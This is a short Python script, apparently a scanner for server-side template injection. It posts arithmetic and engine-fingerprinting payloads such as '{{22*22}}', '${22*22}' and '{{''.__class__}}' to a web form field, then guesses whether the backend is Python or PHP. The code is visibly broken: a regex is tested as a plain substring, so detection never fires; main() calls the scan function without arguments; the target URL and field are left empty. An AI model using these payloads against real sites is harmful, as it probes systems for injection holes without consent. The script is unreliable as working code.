import requests
import re

def templateInjection(url, key):
    payloads = ["22*22", "{22*22}", "{{22*22}}", "{{{22*22}}}", "#{22*22}", "${22*22}", "{{=22*22}}", "<%=22*22%>", "[[${22*22}]]"]
    vulnerable = False
    for payload in payloads:
        r = requests.post(url, data={f"{key}": payload})
        print(r.text)
        if "\b484\b" in r.text:
            vulnerable = True
    return vulnerable

def checkLanguage(url, key):
    if pythonChecker(url, key): return "python"
    elif phpChecker(url, key): return "php"

def pythonChecker(url, key):
    payloads = ["{{7*'7'}}", "{{''.__class__}}"]
    footprints = [r"\b7777777\b", r"<class\s*['\"]str['\"]\s*>|<type\s*['\"]str['\"]\s*>"]
    for payload, footprint in zip(payloads, footprints):
        r = requests.post(url, data={f"{key}": payload})
        if re.search(footprint, r.text):
            print("Python identified")
            return True
    return False

def phpChecker(url, key):
    payloads = ["{{7~7}}", "{{constant('PHP_VERSION')}}", "{{[1,2,3]|join(',')}}"]
    footprints = [r"\b77\b", r"\d+\.\d+\.\d+", r"\b1,2,3\b"]
    for payload, footprint in zip(payloads, footprints):
        r = requests.post(url, data={f"{key}": payload})
        if re.search(footprint, r.text):
            print("PHP identified")
            return True
    return False

    
def main():
    url = ""
    key = ""
    vulnerable = templateInjection()
    if vulnerable:
        lang = checkLanguage(url, key)

    else:
        exit()


if __name__ == "__main__":
    main()